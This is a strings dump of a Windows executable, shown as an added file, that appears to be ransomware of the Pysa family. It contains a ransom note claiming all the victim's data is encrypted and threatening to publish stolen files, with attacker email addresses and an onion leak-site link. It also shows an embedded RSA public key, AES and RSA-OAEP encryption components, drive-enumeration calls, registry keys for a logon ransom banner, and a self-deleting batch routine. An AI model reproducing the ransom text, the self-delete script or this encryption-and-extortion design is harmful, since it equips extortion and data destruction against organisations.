@@ -1,0 +1,1713 @@
+!This program cannot be run in DOS mode.
+`.rdata
+@.data
+.gfids
+@.reloc
+AH;ALW
+~,9~$t
+VWhT_G
+VWhT_G
+tG9uCj
+tC97u?j
+8f;:uf
+:uBj\Xf9
+s79>w3+>S
+s?9>w;+>
+PPhxPG
+A ;A$W
+A0;A4W
+AP;ATW
+Vh;BTW
+Vh;BTW
+D$(;D$$
+D$8+D$4
+u|j(hh
+r^9N@rV
+L$D^[3
+D$<PUV
+D$ RQP
+D$,+D$ 
+x<_^][
+s}j"h<
+L$0_]3
+D$<VSU
+F$_^][Y
+F$_^][Y
+C$_^][
+WU9\$ uE
+\$$UVW
+t$,;D$$
+t$0VWSU
+ax\_^[]
+a8\_^[]
+a8\_^[]
+ax\_^[]
+a8\_^[]
+ax\_^[]
+ax\_^[]
+a8\_^[]
+C$_^][
+u _^]3
+tIQSQP
+3D$L3D$X3D$,
+3D$T3D$(
+3t$<3t$
+3D$43D$$
+D$d3D$H
+3D$03D$T
+D$D3D$L
+3D$(3D$
+D$@3D$H
+3D$,3D$
+D$P3D$D
+3D$03D$ 
+3D$43D$$
+3D$83D$T
+D$d3D$
+3D$<3D$(
+3D$,3D$
+D$d3D$D
+3D$03D$
+3D$ 3D$
+3D$$3D$
+D$d3D$<
+3D$T3D$ 
+D$@3D$(
+3D$$3D$
+3D$,3D$T3D$
+3D$(3D$ 
+3D$,3D$$
+D$d3D$8
+3D$03D$H
+3D$(3D$
+3D$03D$ 
+L$@3D$8
+3D$03D$
+3D$$3D$
+3D$$3D$
+L$D3L$,
+3L$H3L$
+3L$(3L$ 
+3L$43L$,3L$$
+L$d3L$8
+3L$03L$H
+3D$<3D$(
+3D$,3D$
+D$d3D$D
+3D$03D$
+D$L3D$4
+3D$ 3D$
+3D$$3D$
+3D$<3D$H3D$ 
+D$@3D$(
+3D$$3D$P
+D$D3D$,
+3D$H3D$
+D$L3D$0
+3D$(3D$X
+3D$,3D$$
+|$T3t$P
+l$D3l$<
+T$L3T$@
+|$T3D$T
+3|$D3T$
+3T$,3T$P
+3D$03D$
+SUVWj@
+#t$ 3t$
+D$$3D$ #
+D$83D$
+D$$3D$
+D$$3D$ #
+3D$ 3t$(
+D$,3D$
+D$03D$(#
+3D$03t$
+3D$(#D$$3D$(
+T$ 3T$
+T$ 3T$
+T$ 3T$
+T$ 3T$
+\]_^[]
+A ;q$w
+P|_^][
+u*hHtG
+:G;~(|
+:G;~(|
+F<;F8u
+VWhT_G
+L$H_^][3
+L$D_^[3
+~$)~(+
+|$$;\$
+|$(;\$ u
+\$,;l$$u
+t$$RWS
+\$$UVW
+D$,UWP
+D$,UWP
+D$0SVW3
+D$ =Genu
+|$$ntel
+|$(ineI
+|$$cAMD
+|$(enti
+|$$auls
+|$(aurHuv
+)d$0t%
+)L$@t8
+9E$WWV
+t,WW9}
+jA[jZZ+
+QQSVWd
+t!h4RG
+tK<_t<<$t8<<t4<>t0<-t,<a|
+<z~$<A|
+E<$uMR
+<0|L<9
+tE<A|2<P
+t9<_u5
+t.<_u*
+u\hH#F
+<A|,<P
+u)hT"F
+<$u"8F
+<0| <9
+<0|^<8
+URPQQh
+;t$,v-
+UQPXY]Y[
+PVSQSWV
+PPPPPPPP
+^$+^8+
+t#Vht:F
+QSSSSj
+tyPVj@W
+_tcPVj@
+u#j,Xf;
+u0jAXf;
+u0jAXf;
+PPPPPWS
+PP9E u:PPVWP
+j,h@>G
+Wj0XPV
+SVWjA_jZ+
+uBjAYjZ+
+WWWPWS
+u-PWWS
+PQh@VG
+PQhHWG
+SSVWh 
+f9:t!V
+|VWj=S
+QQSWj0j@
+<0|o<9
+tl=HSG
+u^9^\t/
+VX9^`tT
+;N\u\W
+u2Vj@h
+9C`u99C\t4
+9C`u5Wj
+D8(HXt:f
+D8(Ht5F
+SVjA[jZ^+
+jAZjZ^
+PPPPPPPP
+Clone() is not implemented yet.
+unknown
+30820220300D06092A864886F70D01010105000382020D00308202080282020100BAF8F6F5F1488E28F2431AE6DC953D9CBEDDC45002D23B496ED644BBC0BA70DF8ADE4101786222FE442AD4CFF6683C65F80BF3B969218B2B8B259D8CF14D73335D964AB27878DFA0A99546A947F599585D9C9D15319ADA81FE98E27386D1420B9ACB41C8DE203F8CA28288830AF2F72709E181C62162C09DF6CE0E047E522B7BC10BA6E7DE35A4338364BDE7A15471713DD6ECB91C81D23F5A2A4BE94633D2998C987386F36433E6444D6DE1D85C66F4B1B48C23D6C06F2178BF6624BA39D5392C6D2E3A9A8A694F82A3147B0374162766C0C9799BB3E09A080119967833C1730212FC02CE8962CA04A048309CBB085CADE17DB0DC6D43EDD1BA10DF38F820CC6F2089FD8B7931D2B1075A8A3AC473B2FF73CC87C0E8B012D768220F1EBF26F2C2E275B44E81ADD47C292D03B7405AA48EBB4681BA09DC2C522B4A389B9D081FDF0953B7620D3184D4B6472DC55410925ADD7E92984D7176A33F6D52848BE3D0A98238585F0D61A6515DC874FA591D65DE5C9855139B1C746E63CD77DEE348503659D316345766932206CB878E2FD1FEDA1084266A0A3F923B0C743CB63D3A5C0BC1198126A21EC0041481EBB2ABCD432ECEFE641E4515B2CE262087B794E4F95D0A7EA15CD6717894EB910ADCF4EF4AAA08A6D8379CB264B0975CB93C4ECE
+Unknown exception
+bad cast
+bad locale name
+iostream
+iostream stream error
+ios_base::badbit set
+ios_base::failbit set
+ios_base::eofbit set
+', trying to retrieve '
+', stored '
+NameValuePairs: type mismatch for '
+: this object doesn't support resynchronization
+StreamTransformation: this object doesn't support random access
+BufferedTransformation: this object is not attachable
+CryptoMaterial: this object contains invalid values
+CryptoMaterial: this object does not support precomputation
+" not used
+AlgorithmParametersBase: parameter "
+InputBuffer
+EncodingParameters
+Separator
+Terminator
+Uppercase
+GroupSize
+Log2Base
+DecodingLookupArray
+CipherModeBase: feedback size cannot be specified for this cipher mode
+OutputStringPointer
+StringSink: OutputStringPointer not specified
+Unflushable<T>: this object has buffered input that cannot be flushed
+BufferedTransformation: this object doesn't allow input
+vector<T> too long
+string too long
+invalid string position
+Hi Company,
+Every byte on any types of your devices was encrypted.
+Don't try to use backups because it were encrypted too.
+To get all your data back contact us:
+luebegg8024@onionmail.org
+mayakinggw3732@onionmail.org
+lauriabornhat7722@protonmail.com
+Also, be aware that we downloaded files from your servers and in case of non-payment we will be forced to upload them on our website, and if necessary, we will sell them on the darknet.
+Check out our website, we just posted there new updates for our partners: http://pysa2bitc5ldeyfak4seeruqymqs4sj5wt5qkcq7aoyg4h2acqieywad.onion/
+--------------
+   Q: How can I make sure you don't fooling me?
+   A: You can send us 2 files(max 2mb).
+   Q: What to do to get all data back?
+   A: Don't restart the computer, don't move files and write us.
+   Q: What to tell my boss?
+   A: Protect Your System Amigo.
+update.bat
+SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+legalnoticetext
+legalnoticecaption
+SHA-256
+RandomNumberGenerator: IncorporateEntropy not implemented
+BufferedTransformation: this object can't be reinitialized
+: this object doesn't support multiple channels
+ is not a valid key length
+BitBucket
+Cryptographic algorithms are disabled before the power-up self tests are performed.
+Cryptographic algorithms are disabled after a power-up self test failed.
+: this object requires an IV
+: this object cannot use a null IV
+ is less than the minimum of 
+: IV length 
+ exceeds the maximum of 
+: this object doesn't support a special last block
+NullRNG
+NullRNG: NullRNG should only be passed to functions that don't need to generate random bytes
+ bytes
+ byte digest to 
+HashTransformation: can't truncate a 
+PK_DefaultEncryptionFilter: plaintext too long
+bad allocation
+: missing required parameter '
+: Nonblocking input is not implemented by this object.
+PutMessage
+TruncatedDigestSize
+OutputBuffer
+FilterWithBufferedInput: invalid buffer size
+FilterWithBufferedInput
+ArraySink: missing OutputBuffer argument
+StringStore: missing InputBuffer argument
+deque<T> too long
+RoundUpToMultipleOf: integer overflow
+BER decode error
+Integer: division by zero
+Integer: input length is too small
+MontgomeryRepresentation: Montgomery representation requires an odd modulus
+AllocatorBase: requested size would cause integer overflow
+ValueNames
+: this key is too short to encrypt any messages
+ for this public key
+: message length of 
+IteratedHashBase: input data exceeds maximum allowed by hash function 
+D7q/;M
+Modulus
+PublicExponent
+ThisObject:
+: Missing required parameter '
+ThisPointer:
+PaddingByte
+EncodingLookupArray
+BaseN_Encoder
+BaseN_Encoder: Log2Base must be between 1 and 7 inclusive
+BaseN_Decoder
+BaseN_Decoder: Log2Base must be between 1 and 7 inclusive
+Grouper
+0123456789ABCDEF
+0123456789abcdef
+ operation failed with error 
+OS_Rng: 
+Crypto++ RNG
+CryptAcquireContext
+CryptGenRandom
+Timer: QueryPerformanceFrequency failed with error 
+Timer: QueryPerformanceCounter failed with error 
+NodeSize
+identifier removed
+illegal byte sequence
+inappropriate io control operation
+interrupted
+invalid argument
+invalid seek
+io error
+is a directory
+message size
+network down
+network reset
+network unreachable
+no buffer space
+no child process
+no link
+no lock available
+no message available
+no message
+no protocol option
+no space on device
+no stream resources
+no such device or address
+no such device
+no such file or directory
+no such process
+not a directory
+not a socket
+not a stream
+not connected
+not enough memory
+not supported
+operation canceled
+operation in progress
+operation not permitted
+operation not supported
+operation would block
+owner dead
+permission denied
+protocol error
+protocol not supported
+read only file system
+resource deadlock would occur
+resource unavailable try again
+result out of range
+state not recoverable
+stream timeout
+text file busy
+timed out
+too many files open in system
+too many files open
+too many links
+too many symbolic link levels
+value too large
+wrong protocol type
+address family not supported
+address in use
+address not available
+already connected
+argument list too long
+argument out of domain
+bad address
+bad file descriptor
+bad message
+broken pipe
+connection aborted
+connection already in progress
+connection refused
+connection reset
+cross device link
+destination address required
+device or resource busy
+directory not empty
+executable format error
+file exists
+file too large
+filename too long
+function not supported
+host unreachable
+unknown error
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+InitializeCriticalSectionEx
+InitOnceExecuteOnce
+CreateEventExW
+CreateSemaphoreW
+CreateSemaphoreExW
+CreateThreadpoolTimer
+SetThreadpoolTimer
+WaitForThreadpoolTimerCallbacks
+CloseThreadpoolTimer
+CreateThreadpoolWait
+SetThreadpoolWait
+CloseThreadpoolWait
+FlushProcessWriteBuffers
+FreeLibraryWhenCallbackReturns
+GetCurrentProcessorNumber
+CreateSymbolicLinkW
+GetCurrentPackageId
+GetTickCount64
+GetFileInformationByHandleEx
+SetFileInformationByHandle
+GetSystemTimePreciseAsFileTime
+InitializeConditionVariable
+WakeConditionVariable
+WakeAllConditionVariable
+SleepConditionVariableCS
+InitializeSRWLock
+AcquireSRWLockExclusive
+TryAcquireSRWLockExclusive
+ReleaseSRWLockExclusive
+SleepConditionVariableSRW
+CreateThreadpoolWork
+SubmitThreadpoolWork
+CloseThreadpoolWork
+CompareStringEx
+GetLocaleInfoEx
+LCMapStringEx
+0123456789abcdefghijklmnopqrstuvwxyz
+0123456789abcdefghijklmnopqrstuvwxyz
+bad array new length
+bad exception
+__based(
+__cdecl
+__pascal
+__stdcall
+__thiscall
+__fastcall
+__vectorcall
+__clrcall
+__eabi
+__ptr64
+__restrict
+__unaligned
+restrict(
+ delete
+operator
+`vftable'
+`vbtable'
+`vcall'
+`typeof'
+`local static guard'
+`string'
+`vbase destructor'
+`vector deleting destructor'
+`default constructor closure'
+`scalar deleting destructor'
+`vector constructor iterator'
+`vector destructor iterator'
+`vector vbase constructor iterator'
+`virtual displacement map'
+`eh vector constructor iterator'
+`eh vector destructor iterator'
+`eh vector vbase constructor iterator'
+`copy constructor closure'
+`udt returning'
+`local vftable'
+`local vftable constructor closure'
+ new[]
+ delete[]
+`omni callsig'
+`placement delete closure'
+`placement delete[] closure'
+`managed vector constructor iterator'
+`managed vector destructor iterator'
+`eh vector copy constructor iterator'
+`eh vector vbase copy constructor iterator'
+`dynamic initializer for '
+`dynamic atexit destructor for '
+`vector copy constructor iterator'
+`vector vbase copy constructor iterator'
+`managed vector copy constructor iterator'
+`local static thread guard'
+operator "" 
+ Type Descriptor'
+ Base Class Descriptor at (
+ Base Class Array'
+ Class Hierarchy Descriptor'
+ Complete Object Locator'
+template-parameter-
+generic-type-
+`anonymous namespace'
+`non-type-template-parameter
+`template-parameter
+`template-type-parameter-
+`generic-class-parameter-
+`generic-method-parameter-
+`vtordispex{
+`vtordisp{
+`adjustor{
+`local static destructor helper'
+`template static data member constructor helper'
+`template static data member destructor helper'
+static 
+virtual 
+private: 
+protected: 
+public: 
+[thunk]:
+extern "C" 
+short 
+unsigned 
+volatile
+std::nullptr_t 
+std::nullptr_t
+<ellipsis>
+,<ellipsis>
+ throw(
+double
+__int8
+__int16
+__int32
+__int64
+__int128
+<unknown>
+char16_t
+char32_t
+wchar_t
+__w64 
+UNKNOWN
+signed 
+ volatile
+`unknown ecsu'
+union 
+struct 
+class 
+coclass 
+cointerface 
+volatile 
+const 
+cli::array<
+cli::pin_ptr<
+{flat}
+ !"#$%&'()*+,-./0123456789:;<=>?@abcdefghijklmnopqrstuvwxyz[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}~
+[aOni*{
+~ $s%r
+@b;zO]
+v2!L.2
+`h`hhh
+xwpwpp
+(null)
+CorExitProcess
+_hypot
+_nextafter
+ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~
+EnumSystemLocalesEx
+GetUserDefaultLocaleName
+IsValidLocaleName
+LCIDToLocaleName
+LocaleNameToLCID
+Sunday
+Monday
+Tuesday
+Wednesday
+Thursday
+Friday
+Saturday
+January
+February
+August
+September
+October
+November
+December
+MM/dd/yy
+dddd, MMMM dd, yyyy
+HH:mm:ss
+?Dj0Q:W$=
+5s3R6=
+]vQ<)8
+|)P!?Ua0
+Eb2]A=
+u?^p?o4
+y1~?|"
+?x+s7
+?5Od%
+?|I7Z#
+>,'1D=
+?g)([|X>=
+~U`?K 
+:h"?bC
+@H#?43
+Ax#?uN}*
+r7Yr7=
+F0$?3=1
+H`$?h|
+&?~YK|
+sU0&?W
+<8bunz8
+?#%X.y
+F||<##
+<@En[vP
+NAN(SNAN)
+nan(snan)
+NAN(IND)
+nan(ind)
+1#QNAN
+1#SNAN
+?5Wg4p
+%S#[k=
+"B <1=
+.text$di
+.text$mn
+.text$x
+.text$yd
+.idata$5
+.00cfg
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCC
+.CRT$XCL
+.CRT$XCU
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XLA
+.CRT$XLZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.rdata
+.rdata$T
+.rdata$r
+.rdata$sxdata
+.rdata$zzzdbg
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.xdata$x
+.idata$2
+.idata$3
+.idata$4
+.idata$6
+.data$r
+.gfids$x
+.gfids$y
+.tls$ZZZ
+.rsrc$01
+.rsrc$02
+WriteFile
+FindClose
+CloseHandle
+GetLogicalDriveStringsW
+GetModuleFileNameA
+GetDriveTypeW
+GetTempPathA
+CreateFileA
+GetFileAttributesExW
+FindFirstFileW
+FindNextFileW
+ReleaseMutex
+CreateMutexA
+OpenMutexA
+FreeConsole
+HeapAlloc
+HeapFree
+GetProcessHeap
+ExitProcess
+CreateThread
+WaitForMultipleObjects
+GetLastError
+SetLastError
+QueryPerformanceCounter
+QueryPerformanceFrequency
+KERNEL32.dll
+wsprintfW
+wsprintfA
+USER32.dll
+RegCloseKey
+RegOpenKeyExA
+RegSetValueExA
+CryptAcquireContextA
+CryptReleaseContext
+CryptGenRandom
+ADVAPI32.dll
+ShellExecuteA
+SHELL32.dll
+WideCharToMultiByte
+MultiByteToWideChar
+GetStringTypeW
+EnterCriticalSection
+LeaveCriticalSection
+DeleteCriticalSection
+EncodePointer
+DecodePointer
+InitializeCriticalSectionAndSpinCount
+CreateEventW
+TlsAlloc
+TlsGetValue
+TlsSetValue
+TlsFree
+GetSystemTimeAsFileTime
+GetModuleHandleW
+GetProcAddress
+CompareStringW
+LCMapStringW
+GetLocaleInfoW
+GetCPInfo
+SetEvent
+ResetEvent
+WaitForSingleObjectEx
+InitializeSListHead
+IsProcessorFeaturePresent
+IsDebuggerPresent
+UnhandledExceptionFilter
+SetUnhandledExceptionFilter
+GetStartupInfoW
+GetCurrentProcess
+TerminateProcess
+GetCurrentProcessId
+GetCurrentThreadId
+InterlockedPushEntrySList
+RaiseException
+RtlUnwind
+FreeLibrary
+LoadLibraryExW
+MoveFileExW
+HeapReAlloc
+GetModuleHandleExW
+GetStdHandle
+GetCommandLineA
+GetCommandLineW
+GetACP
+IsValidLocale
+GetUserDefaultLCID
+EnumSystemLocalesW
+GetFileType
+FlushFileBuffers
+GetConsoleCP
+GetConsoleMode
+ReadFile
+SetFilePointerEx
+HeapSize
+FindFirstFileExA
+FindNextFileA
+IsValidCodePage
+GetOEMCP
+GetEnvironmentStringsW
+FreeEnvironmentStringsW
+SetEnvironmentVariableA
+SetStdHandle
+WriteConsoleW
+ReadConsoleW
+CreateFileW
+SetEndOfFile
+:Repeat
+del "%s"
+if exist "%s" goto Repeat
+rmdir "%s"
+del "%s"
+Copyright (c) by P.J. Plauger, licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED.
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+                          
+abcdefghijklmnopqrstuvwxyz
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+.?AVNotCopyable@CryptoPP@@
+.?AVRandomNumberGenerator@CryptoPP@@
+.?AVAlgorithm@CryptoPP@@
+.?AVClonable@CryptoPP@@
+.?AVNameValuePairs@CryptoPP@@
+.?AVNullNameValuePairs@CryptoPP@@
+.?AVexception@std@@
+.?AVAutoSeededRandomPool@CryptoPP@@
+.?AVRandomPool@CryptoPP@@
+.?AVException@CryptoPP@@
+.?AVNotImplemented@CryptoPP@@
+.?AVruntime_error@std@@
+.?AVfailure@ios_base@std@@
+.?AVsystem_error@std@@
+.?AV_System_error@std@@
+.?AVValueTypeMismatch@NameValuePairs@CryptoPP@@
+.?AVInvalidArgument@CryptoPP@@
+.?AVInvalidMaterial@CryptoMaterial@CryptoPP@@
+.?AVInvalidDataFormat@CryptoPP@@
+.?AVParameterNotUsed@AlgorithmParametersBase@CryptoPP@@
+.?AUInputRejected@?$InputRejecting@VFilter@CryptoPP@@@CryptoPP@@
+.?AVCannotFlush@CryptoPP@@
+.?AVConstByteArrayParameter@CryptoPP@@
+.?AUInputRejected@?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AVbad_cast@std@@
+.PAV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@
+.?AVios_base@std@@
+.?AV?$_Iosb@H@std@@
+.?AV?$basic_ios@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_streambuf@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_istream@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_ostream@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_iostream@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_filebuf@DU?$char_traits@D@std@@@std@@
+.?AV?$basic_fstream@DU?$char_traits@D@std@@@std@@
+.?AV_Facet_base@std@@
+.?AVfacet@locale@std@@
+.?AU_Crt_new_delete@std@@
+.?AVcodecvt_base@std@@
+.?AUctype_base@std@@
+.?AV?$ctype@D@std@@
+.?AVerror_category@std@@
+.?AV_Generic_error_category@std@@
+.?AV_Iostream_error_category@std@@
+.?AVBufferedTransformation@CryptoPP@@
+.?AVWaitable@CryptoPP@@
+.?AVSimpleKeyingInterface@CryptoPP@@
+.?AVBlockTransformation@CryptoPP@@
+.?AVStreamTransformation@CryptoPP@@
+.?AVHashTransformation@CryptoPP@@
+.?AVBlockCipher@CryptoPP@@
+.?AVSymmetricCipher@CryptoPP@@
+.?AVCryptoMaterial@CryptoPP@@
+.?AVPublicKey@CryptoPP@@
+.?AVAsymmetricAlgorithm@CryptoPP@@
+.?AVPublicKeyAlgorithm@CryptoPP@@
+.?AVPK_CryptoSystem@CryptoPP@@
+.?AVPK_Encryptor@CryptoPP@@
+.?AVASN1Object@CryptoPP@@
+.?AVStore@CryptoPP@@
+.?AV?$AutoSignaling@V?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@@CryptoPP@@
+.?AV?$InputRejecting@VBufferedTransformation@CryptoPP@@@CryptoPP@@
+.?AVSink@CryptoPP@@
+.?AV?$Bufferless@VSink@CryptoPP@@@CryptoPP@@
+.?AVBase@Rijndael@CryptoPP@@
+.?AV?$BlockCipherImpl@URijndael_Info@CryptoPP@@VBlockCipher@2@@CryptoPP@@
+.?AV?$AlgorithmImpl@V?$SimpleKeyingInterfaceImpl@V?$TwoBases@VBlockCipher@CryptoPP@@URijndael_Info@2@@CryptoPP@@V12@@CryptoPP@@V12@@CryptoPP@@
+.?AV?$SimpleKeyingInterfaceImpl@V?$TwoBases@VBlockCipher@CryptoPP@@URijndael_Info@2@@CryptoPP@@V12@@CryptoPP@@
+.?AV?$TwoBases@VBlockCipher@CryptoPP@@URijndael_Info@2@@CryptoPP@@
+.?AURijndael_Info@CryptoPP@@
+.?AV?$FixedBlockSize@$0BA@@CryptoPP@@
+.?AV?$VariableKeyLength@$0BA@$0BA@$0CA@$07$03$0A@@CryptoPP@@
+.?AVEnc@Rijndael@CryptoPP@@
+.?AV?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@
+.?AV?$ClonableImpl@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@VEnc@Rijndael@2@@CryptoPP@@
+.?AVAlgorithmParametersBase@CryptoPP@@
+.?AV?$AlgorithmParametersTemplate@_N@CryptoPP@@
+.?AV?$AlgorithmParametersTemplate@H@CryptoPP@@
+.?AV?$AlgorithmParametersTemplate@VConstByteArrayParameter@CryptoPP@@@CryptoPP@@
+.?AVFilter@CryptoPP@@
+.?AV?$Bufferless@VFilter@CryptoPP@@@CryptoPP@@
+.?AVFilterWithBufferedInput@CryptoPP@@
+.?AV?$Unflushable@VFilter@CryptoPP@@@CryptoPP@@
+.?AVProxyFilter@CryptoPP@@
+.?AVSimpleProxyFilter@CryptoPP@@
+.?AVPK_EncryptorFilter@CryptoPP@@
+.?AV?$StringSinkTemplate@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@CryptoPP@@
+.?AVStringStore@CryptoPP@@
+.?AVSource@CryptoPP@@
+.?AV?$InputRejecting@VFilter@CryptoPP@@@CryptoPP@@
+.?AVStringSource@CryptoPP@@
+.?AV?$SourceTemplate@VStringStore@CryptoPP@@@CryptoPP@@
+.?AVTrapdoorFunctionBounds@CryptoPP@@
+.?AVRandomizedTrapdoorFunction@CryptoPP@@
+.?AVTrapdoorFunction@CryptoPP@@
+.?AVPK_EncryptionMessageEncodingMethod@CryptoPP@@
+.?AVTF_EncryptorBase@CryptoPP@@
+.?AV?$TF_CryptoSystemBase@VPK_Encryptor@CryptoPP@@V?$TF_Base@VRandomizedTrapdoorFunction@CryptoPP@@VPK_EncryptionMessageEncodingMethod@2@@2@@CryptoPP@@
+.?AV?$PK_FixedLengthCryptoSystemImpl@VPK_Encryptor@CryptoPP@@@CryptoPP@@
+.?AV?$TF_Base@VRandomizedTrapdoorFunction@CryptoPP@@VPK_EncryptionMessageEncodingMethod@2@@CryptoPP@@
+.?AVMaskGeneratingFunction@CryptoPP@@
+.?AVP1363_MGF1@CryptoPP@@
+.?AVX509PublicKey@CryptoPP@@
+.?AV?$ASN1CryptoMaterial@VPublicKey@CryptoPP@@@CryptoPP@@
+.?AVSHA1@CryptoPP@@
+.?AV?$IteratedHashWithStaticTransform@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@$0BE@VSHA1@2@$0A@$0A@@CryptoPP@@
+.?AV?$ClonableImpl@VSHA1@CryptoPP@@V?$AlgorithmImpl@V?$IteratedHash@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@VHashTransformation@2@@CryptoPP@@VSHA1@2@@2@@CryptoPP@@
+.?AV?$AlgorithmImpl@V?$IteratedHash@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@VHashTransformation@2@@CryptoPP@@VSHA1@2@@CryptoPP@@
+.?AV?$IteratedHash@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@VHashTransformation@2@@CryptoPP@@
+.?AV?$IteratedHashBase@IVHashTransformation@CryptoPP@@@CryptoPP@@
+.?AVOAEP_Base@CryptoPP@@
+.?AV?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@CryptoPP@@
+.?AUEncryptionStandard@CryptoPP@@
+.?AVRSAFunction@CryptoPP@@
+.?AV?$TF_EncryptorImpl@U?$TF_CryptoSchemeOptions@V?$TF_ES@URSA@CryptoPP@@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@H@CryptoPP@@URSA@2@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@@CryptoPP@@@CryptoPP@@
+.?AV?$TF_ObjectImpl@VTF_EncryptorBase@CryptoPP@@U?$TF_CryptoSchemeOptions@V?$TF_ES@URSA@CryptoPP@@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@H@CryptoPP@@URSA@2@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@@2@VRSAFunction@2@@CryptoPP@@
+.?AV?$TF_ObjectImplBase@VTF_EncryptorBase@CryptoPP@@U?$TF_CryptoSchemeOptions@V?$TF_ES@URSA@CryptoPP@@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@H@CryptoPP@@URSA@2@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@@2@VRSAFunction@2@@CryptoPP@@
+.?AV?$AlgorithmImpl@VTF_EncryptorBase@CryptoPP@@V?$TF_ES@URSA@CryptoPP@@V?$OAEP@VSHA1@CryptoPP@@VP1363_MGF1@2@@2@H@2@@CryptoPP@@
+.?AVBaseN_Encoder@CryptoPP@@
+.?AVBaseN_Decoder@CryptoPP@@
+.?AVGrouper@CryptoPP@@
+.?AVHexEncoder@CryptoPP@@
+.?AVHexDecoder@CryptoPP@@
+.?AVCipherModeBase@CryptoPP@@
+.?AVBlockOrientedCipherModeBase@CryptoPP@@
+.?AVCBC_ModeBase@CryptoPP@@
+.?AVCBC_Encryption@CryptoPP@@
+.?AV?$CipherModeFinalTemplate_CipherHolder@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@VCBC_Encryption@2@@CryptoPP@@
+.?AV?$ObjectHolder@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@@CryptoPP@@
+.?AV?$AlgorithmImpl@VCBC_Encryption@CryptoPP@@V?$CipherModeFinalTemplate_CipherHolder@V?$BlockCipherFinal@$0A@VEnc@Rijndael@CryptoPP@@@CryptoPP@@VCBC_Encryption@2@@2@@CryptoPP@@
+.?AV?$codecvt@DDU_Mbstatet@@@std@@
+.?AV?$AlgorithmParametersTemplate@PBH@CryptoPP@@
+.?AVArraySink@CryptoPP@@
+.?AVSHA256@CryptoPP@@
+.?AV?$IteratedHashWithStaticTransform@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@$0CA@VSHA256@2@$0CA@$00@CryptoPP@@
+.?AV?$ClonableImpl@VSHA256@CryptoPP@@V?$AlgorithmImpl@V?$IteratedHash@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@VHashTransformation@2@@CryptoPP@@VSHA256@2@@2@@CryptoPP@@
+.?AV?$AlgorithmImpl@V?$IteratedHash@IU?$EnumToType@W4ByteOrder@CryptoPP@@$00@CryptoPP@@$0EA@VHashTransformation@2@@CryptoPP@@VSHA256@2@@CryptoPP@@
+.?AVTimerBase@CryptoPP@@
+.?AVTimer@CryptoPP@@
+.?AUNoChannelSupport@BufferedTransformation@CryptoPP@@
+.?AVInvalidKeyLength@CryptoPP@@
+.?AVSelfTestFailure@CryptoPP@@
+.?AVBitBucket@CryptoPP@@
+.?AVClassNullRNG@CryptoPP@@
+.?AVPK_DefaultEncryptionFilter@CryptoPP@@
+.?AVbad_alloc@std@@
+.?AUBlockingInputOnly@BufferedTransformation@CryptoPP@@
+.?AVByteArrayParameter@CryptoPP@@
+.?AVCombinedNameValuePairs@CryptoPP@@
+.?AUFilterPutSpaceHelper@CryptoPP@@
+.?AVHashFilter@CryptoPP@@
+.?AV?$CustomSignalPropagation@VSink@CryptoPP@@@CryptoPP@@
+.?AV?$CustomFlushPropagation@VSink@CryptoPP@@@CryptoPP@@
+.?AVOutputProxy@CryptoPP@@
+.?AVBERDecodeErr@CryptoPP@@
+.?AVDivideByZero@Integer@CryptoPP@@
+.?AVInteger@CryptoPP@@
+.?AUInitializeInteger@CryptoPP@@
+.?AVModularArithmetic@CryptoPP@@
+.?AV?$AbstractRing@VInteger@CryptoPP@@@CryptoPP@@
+.?AV?$AbstractGroup@VInteger@CryptoPP@@@CryptoPP@@
+.?AVMontgomeryRepresentation@CryptoPP@@
+.?AVMultiplicativeGroupT@?$AbstractRing@VInteger@CryptoPP@@@CryptoPP@@
+.?AV?$AbstractEuclideanDomain@VInteger@CryptoPP@@@CryptoPP@@
+.?AVOID@CryptoPP@@
